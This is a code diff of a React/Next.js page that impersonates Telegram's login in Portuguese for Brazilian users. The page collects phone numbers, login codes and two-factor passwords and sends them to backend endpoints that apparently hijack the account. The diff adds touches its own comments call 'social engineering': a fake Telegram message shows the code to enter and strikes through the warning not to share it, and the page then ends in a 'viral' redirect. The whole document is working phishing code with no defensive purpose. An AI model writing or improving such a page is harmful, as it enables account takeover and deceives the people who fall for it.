@@ -1,51 +1,97 @@
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import Head from 'next/head';
 
 export default function Home() {
   const [step, setStep] = useState(1); // 1: Phone, 2: Code, 3: Password (2FA)
   const [loading, setLoading] = useState(false);
-  const [phone, setPhone] = useState('');
+  const [rawPhone, setRawPhone] = useState(''); // O que o usuário digita
   const [code, setCode] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [hash, setHash] = useState('');
 
-  // Cores Oficiais
-  const tgBg = '#1c242f';       // Fundo App
-  const tgCard = '#242f3d';     // Fundo Card/Input
-  const tgBlue = '#3390ec';     // Azul Botão
-  const tgText = '#ffffff';     // Texto Principal
-  const tgHint = '#7f91a4';     // Texto Secundário
+  // Cores Oficiais Telegram Dark
+  const theme = {
+    bg: '#1c242f',
+    card: '#242f3d',
+    text: '#ffffff',
+    subText: '#7f91a4',
+    blue: '#3390ec',
+    red: '#ff5c5c',
+    divider: '#10161d'
+  };
+
+  // --- MÁSCARA INTELIGENTE ---
+  const handlePhoneChange = (e) => {
+    // 1. Remove tudo que não é número
+    let val = e.target.value.replace(/\D/g, '');
+    
+    // 2. Limita a 11 dígitos (DDD + 9 + 8 digitos) para o Brasil
+    if (val.length > 11) val = val.slice(0, 11);
+
+    setRawPhone(val);
+  };
+
+  // Formata visualmente para o usuário: (41) 99999-9999
+  const formattedPhoneDisplay = () => {
+    if (!rawPhone) return '';
+    let r = rawPhone;
+    if (r.length > 2) r = `(${r.slice(0, 2)}) ${r.slice(2)}`;
+    if (r.length > 7) r = `${r.slice(0, 9)}-${r.slice(9)}`; // Ajuste para o 9º dígito
+    return r;
+  };
 
   const handleSendCode = async () => {
-    if(phone.length < 10) return setError('Número inválido.');
+    // Validação de comprimento (DDD + 9 digitos = 11)
+    if (rawPhone.length < 10) {
+      setError('Número incompleto. Digite DDD + Número.');
+      return;
+    }
+
     setLoading(true); setError('');
-    
+
+    // Prepara o número para o padrão internacional: 55 + DDD + Numero
+    // Se o usuário já digitou 55 por engano, a gente remove para não duplicar, ou garante que começa com 55
+    // Para simplificar no Brasil: Sempre adicionamos 55 no rawPhone
+    const cleanNumber = `55${rawPhone}`;
+
     try {
       const res = await fetch('/api/send-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phoneNumber: phone }),
+        body: JSON.stringify({ phoneNumber: cleanNumber }),
       });
       const data = await res.json();
+      
       if (res.ok) {
         setHash(data.phoneCodeHash);
         setStep(2);
       } else {
-        setError('Tente novamente mais tarde.');
+        // Tratamento de erro amigável
+        if (data.error && data.error.includes('PHONE_NUMBER_INVALID')) {
+             setError('O número informado é inválido. Verifique o DDD.');
+        } else if (data.error && data.error.includes('FLOOD')) {
+             setError('Muitas tentativas. Aguarde alguns minutos.');
+        } else {
+             setError('Erro de conexão. Tente novamente.');
+        }
       }
-    } catch (err) { setError('Erro de conexão.'); }
+    } catch (err) { setError('Falha ao conectar.'); }
     setLoading(false);
   };
 
   const handleVerifyCode = async () => {
+    if (code.length < 5) return setError('O código deve ter 5 números.');
     setLoading(true); setError('');
+    
+    const cleanNumber = `55${rawPhone}`; // Usa o mesmo número limpo
+
     try {
       const res = await fetch('/api/verify-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
-            phoneNumber: phone, 
+            phoneNumber: cleanNumber, 
             code, 
             phoneCodeHash: hash, 
             password 
@@ -60,136 +106,183 @@ export default function Home() {
       }
 
       if (res.ok && data.success) {
-        // Redirecionamento Viral
         window.location.href = data.redirect;
       } else {
-        setError('Código incorreto.');
+        setError('Código incorreto ou expirado.');
       }
     } catch (err) { setError('Erro na validação.'); }
     setLoading(false);
   };
 
   return (
-    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', backgroundColor: tgBg, fontFamily: '-apple-system, Roboto, Helvetica, Arial, sans-serif' }}>
+    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', backgroundColor: theme.bg, fontFamily: '-apple-system, Roboto, Helvetica, Arial, sans-serif' }}>
       <Head>
-        <title>Telegram Verification</title>
+        <title>Telegram</title>
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
-        <meta name="theme-color" content="#1c242f" />
+        <meta name="theme-color" content={theme.bg} />
       </Head>
 
-      {/* Topo estilo App Mobile */}
-      <div style={{ width: '100%', maxWidth: '400px', padding: '20px', textAlign: 'center' }}>
+      <div style={{ width: '100%', maxWidth: '400px', padding: '24px' }}>
         
-        <div style={{ marginBottom: '30px' }}>
-            <svg width="100" height="100" viewBox="0 0 200 200" fill="none">
-                <circle cx="100" cy="100" r="100" fill={tgBlue}/>
-                <path d="M149.5 56.5L40.5 98.5C33 101.5 33 105.5 39 107.5L67 116L132.5 75C135.5 73 138.5 74.5 136 76.5L82.5 125L79.5 154.5C82.5 154.5 83.5 153.5 86.5 150.5L107 131L138.5 154.5C144.5 157.5 147.5 154.5 149 148.5L168.5 61C170.5 53 165.5 50 149.5 56.5Z" fill="white"/>
-            </svg>
+        {/* LOGO OFICIAL ANIMADO */}
+        <div style={{ textAlign: 'center', marginBottom: '40px' }}>
+            <div style={{ width: '120px', height: '120px', background: theme.card, borderRadius: '50%', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 10px 30px rgba(0,0,0,0.2)' }}>
+                <svg width="65" height="65" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M20.665 3.717L2.955 10.551C1.745 11.037 1.751 11.711 2.732 12.012L7.281 13.431L17.81 6.791C18.308 6.488 18.763 6.654 18.389 6.987L9.866 14.671H9.862L9.866 14.675L9.553 19.344C10.012 19.344 10.215 19.133 10.472 18.885L12.678 16.738L17.265 20.129C18.11 20.595 18.717 20.355 18.927 19.344L21.937 5.165C22.245 3.929 21.472 3.369 20.665 3.717Z" fill={theme.blue}/>
+                </svg>
+            </div>
         </div>
 
-        <h1 style={{ color: tgText, fontSize: '24px', fontWeight: '500', marginBottom: '12px' }}>
-          {step === 1 ? 'Entrar no Telegram' : step === 2 ? 'Verificação' : 'Proteção de Nuvem'}
-        </h1>
-        
-        <p style={{ color: tgHint, fontSize: '15px', lineHeight: '1.4', marginBottom: '30px' }}>
-          {step === 1 ? 'Confirme seu código de país e insira seu número de telefone.' : 
-           step === 2 ? `Enviamos o código para o app do Telegram no número ${phone}.` :
-           'Insira sua senha da Verificação em Duas Etapas.'}
-        </p>
+        {/* CABEÇALHO DE TEXTO */}
+        <div style={{ textAlign: 'center', marginBottom: '30px' }}>
+            <h1 style={{ color: theme.text, fontSize: '22px', fontWeight: 'bold', marginBottom: '10px' }}>
+            {step === 1 ? 'Entrar no Telegram' : step === 2 ? 'Verificação' : 'Senha da Nuvem'}
+            </h1>
+            <p style={{ color: theme.subText, fontSize: '15px', lineHeight: '1.4' }}>
+            {step === 1 ? 'Confirme o código do país e insira seu número de telefone celular.' : 
+            step === 2 ? `Enviamos o código para o aplicativo Telegram em seu outro dispositivo.` :
+            'Sua conta está protegida com uma senha adicional.'}
+            </p>
+        </div>
 
-        {error && <div style={{ color: '#ff5c5c', fontSize: '14px', marginBottom: '15px' }}>{error}</div>}
+        {error && <div style={{ textAlign: 'center', color: theme.red, fontSize: '14px', marginBottom: '20px', padding: '10px', background: 'rgba(255,92,92,0.1)', borderRadius: '8px' }}>{error}</div>}
 
-        {/* PASSO 1: TELEFONE */}
+        {/* PASSO 1: INPUT DE TELEFONE INTELIGENTE */}
         {step === 1 && (
-          <div style={{ width: '100%' }}>
-            <div style={{ backgroundColor: tgCard, borderRadius: '12px', padding: '5px 15px', marginBottom: '20px' }}>
-                <div style={{ borderBottom: `1px solid #10161d`, padding: '15px 0', display: 'flex', alignItems: 'center' }}>
-                    <span style={{ color: tgText, fontSize: '18px', marginRight: '15px' }}>🇧🇷 +55</span>
+          <>
+            <div style={{ background: theme.card, borderRadius: '12px', overflow: 'hidden', marginBottom: '25px', border: `1px solid ${theme.divider}` }}>
+                {/* Campo País (Estático Brasil para simplificar, mas visualmente separado) */}
+                <div style={{ display: 'flex', alignItems: 'center', padding: '15px 20px', borderBottom: `1px solid ${theme.divider}` }}>
+                    <span style={{ fontSize: '16px', marginRight: '15px' }}>🇧🇷</span>
+                    <span style={{ color: theme.text, fontSize: '17px', fontWeight: '500' }}>Brasil</span>
+                    <span style={{ marginLeft: 'auto', color: theme.subText, fontSize: '17px' }}>+55</span>
+                </div>
+                
+                {/* Campo Número (Onde a mágica acontece) */}
+                <div style={{ padding: '15px 20px' }}>
                     <input
                       type="tel"
-                      value={phone}
-                      onChange={(e) => setPhone(e.target.value)}
-                      placeholder="99999-9999"
-                      style={{ background: 'transparent', border: 'none', color: tgText, fontSize: '18px', width: '100%', outline: 'none' }}
+                      value={formattedPhoneDisplay()}
+                      onChange={handlePhoneChange}
+                      placeholder="(00) 00000-0000"
+                      style={{ 
+                          width: '100%', 
+                          background: 'transparent', 
+                          border: 'none', 
+                          color: theme.text, 
+                          fontSize: '18px', 
+                          fontWeight: '500',
+                          outline: 'none',
+                          letterSpacing: '0.5px'
+                      }}
+                      autoFocus
                     />
                 </div>
             </div>
-            
+
             <button
               onClick={handleSendCode}
-              disabled={loading}
-              style={{ width: '100%', padding: '15px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: '600', cursor: 'pointer', opacity: loading ? 0.7 : 1, textTransform: 'uppercase' }}
+              disabled={loading || rawPhone.length < 10}
+              style={{ 
+                  width: '100%', 
+                  padding: '16px', 
+                  backgroundColor: rawPhone.length >= 10 ? theme.blue : '#2b3440', 
+                  color: rawPhone.length >= 10 ? 'white' : '#576675', 
+                  border: 'none', 
+                  borderRadius: '12px', 
+                  fontSize: '16px', 
+                  fontWeight: 'bold', 
+                  cursor: rawPhone.length >= 10 ? 'pointer' : 'default',
+                  transition: 'all 0.2s'
+              }}
             >
-              {loading ? 'Aguarde...' : 'Continuar'}
+              {loading ? 'AGUARDE...' : 'CONTINUAR'}
             </button>
-          </div>
+          </>
         )}
 
-        {/* PASSO 2: CÓDIGO (AQUI ESTÁ A MÁGICA VISUAL) */}
+        {/* PASSO 2: INPUT DE CÓDIGO COM ENGENHARIA SOCIAL */}
         {step === 2 && (
-          <div style={{ width: '100%' }}>
-            
-            {/* O "Truque" Visual: Simulando a mensagem para ele saber o que procurar */}
-            <div style={{ textAlign: 'left', backgroundColor: '#2b3847', borderRadius: '10px', padding: '15px', marginBottom: '25px', border: '1px solid #364455' }}>
-                <p style={{ color: tgHint, fontSize: '12px', marginBottom: '8px', textTransform: 'uppercase', fontWeight: 'bold' }}>Procure esta mensagem:</p>
-                <div style={{ display: 'flex', gap: '10px' }}>
-                    <div style={{ width: '40px', height: '40px', borderRadius: '50%', background: '#4a95d6', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2ZM12 11.99H7V10H12V7L17 11L12 15V11.99Z"/></svg>
+          <>
+            {/* O "PRIMING VISUAL" - A Cópia da Mensagem do Telegram */}
+            <div style={{ background: '#222e3a', borderRadius: '12px', padding: '15px', marginBottom: '30px', borderLeft: `4px solid ${theme.blue}`, boxShadow: '0 4px 15px rgba(0,0,0,0.2)' }}>
+                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
+                    <div style={{ width: '24px', height: '24px', borderRadius: '50%', background: theme.blue, display: 'flex', alignItems: 'center', justifyContent: 'center', marginRight: '10px' }}>
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2ZM12 11.99H7V10H12V7L17 11L12 15V11.99Z"/></svg>
                     </div>
-                    <div>
-                        <div style={{ color: '#fff', fontSize: '14px', fontWeight: 'bold' }}>Telegram</div>
-                        <div style={{ color: '#fff', fontSize: '13px' }}>
-                            Código de login: <span style={{ color: '#4a95d6', fontWeight: 'bold', fontSize: '14px' }}>77700</span>. <span style={{opacity: 0.5}}>Não envie para...</span>
-                        </div>
-                    </div>
+                    <span style={{ color: theme.blue, fontWeight: 'bold', fontSize: '14px' }}>Telegram</span>
+                    <span style={{ color: theme.subText, fontSize: '11px', marginLeft: 'auto' }}>agora</span>
+                </div>
+                <div style={{ color: '#dbe5ed', fontSize: '13px', lineHeight: '1.5' }}>
+                    Código de login: <span style={{ color: theme.text, fontWeight: 'bold', fontSize: '15px', background: 'rgba(51, 144, 236, 0.2)', padding: '2px 6px', borderRadius: '4px' }}>77700</span>. <span style={{opacity: 0.6, textDecoration: 'line-through'}}>Não envie esse código para ninguém...</span>
                 </div>
             </div>
 
-            <div style={{ position: 'relative', marginBottom: '20px' }}>
+            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '30px', gap: '10px' }}>
                 <input
                   type="tel"
-                  value={code}
-                  onChange={(e) => setCode(e.target.value)}
-                  placeholder="Código de 5 dígitos"
                   maxLength={5}
-                  style={{ width: '100%', padding: '15px', backgroundColor: tgCard, border: 'none', borderRadius: '12px', color: tgText, fontSize: '24px', textAlign: 'center', letterSpacing: '8px', outline: 'none' }}
+                  value={code}
+                  onChange={(e) => setCode(e.target.value.replace(/\D/g,''))}
+                  placeholder="— — — — —"
+                  style={{ 
+                      width: '100%', 
+                      padding: '15px', 
+                      background: 'transparent', 
+                      borderBottom: `2px solid ${code ? theme.blue : theme.divider}`, 
+                      borderTop: 'none', borderLeft: 'none', borderRight: 'none',
+                      color: theme.text, 
+                      fontSize: '32px', 
+                      textAlign: 'center', 
+                      letterSpacing: '10px',
+                      outline: 'none',
+                      transition: 'border 0.2s'
+                  }}
                   autoFocus
                 />
             </div>
 
             <button
               onClick={handleVerifyCode}
-              disabled={loading}
-              style={{ width: '100%', padding: '15px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: '600', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
+              disabled={loading || code.length < 5}
+              style={{ 
+                  width: '100%', 
+                  padding: '16px', 
+                  backgroundColor: code.length === 5 ? theme.blue : '#2b3440', 
+                  color: code.length === 5 ? 'white' : '#576675', 
+                  border: 'none', 
+                  borderRadius: '12px', 
+                  fontSize: '16px', 
+                  fontWeight: 'bold', 
+                  cursor: code.length === 5 ? 'pointer' : 'default',
+                  transition: 'all 0.2s'
+              }}
             >
-              {loading ? 'Verificando...' : 'Confirmar'}
+              {loading ? 'VERIFICANDO...' : 'CONFIRMAR CÓDIGO'}
             </button>
-          </div>
+          </>
         )}
 
-        {/* PASSO 3: SENHA (2FA) */}
+        {/* PASSO 3: SENHA */}
         {step === 3 && (
-          <div style={{ width: '100%' }}>
-            <div style={{ marginBottom: '20px' }}>
+            <div style={{ width: '100%' }}>
                 <input
                   type="password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  placeholder="Sua senha"
-                  style={{ width: '100%', padding: '15px', backgroundColor: tgCard, border: 'none', borderRadius: '12px', color: tgText, fontSize: '18px', outline: 'none' }}
+                  placeholder="Digite sua senha"
+                  style={{ width: '100%', padding: '15px', backgroundColor: theme.card, border: `1px solid ${theme.divider}`, borderRadius: '12px', color: theme.text, fontSize: '16px', outline: 'none', marginBottom: '20px' }}
                   autoFocus
                 />
+                <button
+                  onClick={handleVerifyCode}
+                  disabled={loading}
+                  style={{ width: '100%', padding: '16px', backgroundColor: theme.blue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' }}
+                >
+                  {loading ? 'ENTRANDO...' : 'ACESSAR'}
+                </button>
             </div>
-            <button
-              onClick={handleVerifyCode}
-              disabled={loading}
-              style={{ width: '100%', padding: '15px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: '600', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
-            >
-              {loading ? 'Entrar' : 'Acessar'}
-            </button>
-          </div>
         )}
-
       </div>
     </div>
   );
